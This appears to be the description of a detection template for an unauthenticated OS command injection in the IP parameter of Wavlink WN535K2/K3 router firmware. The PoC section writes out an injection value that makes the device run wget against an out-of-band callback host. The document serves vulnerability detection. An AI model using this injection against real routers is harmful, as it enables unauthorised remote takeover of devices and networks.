## Vulnerability
OS command injection in Wavlink WN535K2 and WN535K3 router firmware at `/cgi-bin/touchlist_sync.cgi` via manipulation of the `IP` parameter. An unauthenticated remote attacker can inject arbitrary OS commands (CWE-78) to execute malware, exfiltrate sensitive data, modify system files, or achieve full device and network compromise.

CVSS 3.1: 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H).  
Impact includes complete system takeover without credentials.  
Remediation: apply the latest vendor firmware update.

## PoC / Detection
Classification: rce

The template issues a single unauthenticated raw GET request injecting `;wget+http://{{interactsh-url}};` into the `IP` query parameter. Detection succeeds when the server returns HTTP 500 and an out-of-band HTTP interaction is received by the interactsh server, confirming command execution without performing destructive actions.
